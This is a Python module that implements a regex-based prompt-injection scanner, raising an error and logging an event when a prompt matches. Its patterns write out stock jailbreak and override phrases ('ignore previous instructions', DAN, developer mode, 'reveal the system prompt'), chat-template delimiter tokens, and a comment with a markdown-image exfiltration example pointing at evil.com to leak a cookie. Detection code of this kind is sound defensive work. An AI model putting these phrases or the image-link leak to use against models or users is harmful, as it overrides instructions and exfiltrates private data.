import logging
import re

logger = logging.getLogger(__name__)


class PromptInjectionError(ValueError):
    """Exception raised when a potential prompt injection is detected."""

    pass


class PromptInjectionScanner:
    """
    Defense-in-depth heuristic pattern scanner for direct prompt injection detection.
    Part of a multi-layered boundary alongside structural XML delimiters, untrusted data system
    prompts, tool authorization contexts, and AST sandboxing.
    """

    # Compile heuristics patterns for jailbreak and system override detection
    PATTERNS = [
        re.compile(r"ignore\s+(?:the\s+)?prior\s+instructions", re.IGNORECASE),
        re.compile(r"ignore\s+(?:the\s+)?above\s+instructions", re.IGNORECASE),
        re.compile(r"ignore\s+(?:the\s+)?previous\s+instructions", re.IGNORECASE),
        re.compile(
            r"disregard\s+(?:all\s+)?(?:prior|previous|system)\s+instructions",
            re.IGNORECASE,
        ),
        re.compile(r"system\s+override", re.IGNORECASE),
        re.compile(r"you\s+are\s+now\s+an?\s+unrestricted\s+model", re.IGNORECASE),
        re.compile(r"developer\s+mode\s+(?:enabled|activated|on)", re.IGNORECASE),
        re.compile(r"\bDAN\b|\bdo\s+anything\s+now\b", re.IGNORECASE),
        re.compile(r"bypass\s+(?:the\s+)?safeguards", re.IGNORECASE),
        re.compile(
            r"reveal\s+(?:the\s+)?(?:system|internal)\s+(?:prompt|instructions)",
            re.IGNORECASE,
        ),
        # Delimiter and role injection patterns
        re.compile(r"<\|(?:im_start|im_end|endoftext)\|>", re.IGNORECASE),
        re.compile(r"\[INST\]|\[/INST\]", re.IGNORECASE),
        # Detect markdown image extraction injection attempts (e.g. ![leak](http://evil.com/cookie))
        re.compile(r"!\[.*\]\(http.*\)", re.IGNORECASE),
    ]

    @classmethod
    def scan_prompt(cls, prompt: str) -> None:
        """
        Scan a user prompt for potential prompt injection.
        Logs a sanitized PROMPT_INJECTION_BLOCKED event and raises PromptInjectionError if matched.
        """
        if not prompt:
            return

        for pattern in cls.PATTERNS:
            if pattern.search(prompt):
                logger.warning(
                    "PROMPT_INJECTION_BLOCKED: Adversarial instruction pattern detected.",
                    extra={
                        "security_event": "PROMPT_INJECTION_BLOCKED",
                        "pattern_matched": pattern.pattern,
                    },
                )
                raise PromptInjectionError(
                    "Potential prompt injection or safety override detected."
                )
